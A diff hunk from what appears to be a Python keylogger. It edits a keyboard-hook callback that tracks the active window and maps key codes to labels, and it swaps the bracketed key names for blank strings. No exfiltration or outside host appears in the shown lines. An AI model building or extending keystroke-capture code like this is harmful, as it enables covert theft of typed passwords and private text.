@@ -70,23 +70,23 @@ def pushing(event):
     window = event.WindowName
     keys = {
             13: ' [ENTER] ',
-            8: ' [BACKSPACE] ',
-            162: ' [CTRL] ',
-            163: ' [CTRL] ',
-            164: ' [ALT] ',
-            165: ' [ALT] ',
-            160: ' [SHIFT] ',
-            161: ' [SHIFT] ',
-            46: ' [DELETE] ',
-            32: ' [SPACE] ',
-            27: ' [ESC] ',
-            9: ' [TAB] ',
-            20: ' [CAPSLOCK] ',
-            38: ' [UP] ',
-            40: ' [DOWN] ',
-            37: ' [LEFT] ',
-            39: ' [RIGHT] ',
-            91: ' [SUPER] '
+            8: ' ',
+            162: '   ',
+            163: '  ',
+            164: '  ',
+            165: '  ',
+            160: '  ',
+            161: '  ',
+            46: '  ',
+            32: ' ',
+            27: '  ',
+            9: '  ',
+            20: '  ',
+            38: '  ',
+            40: '  ',
+            37: ' ',
+            39: ' ',
+            91: '  '
             }
     keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
     if window != lastWindow:
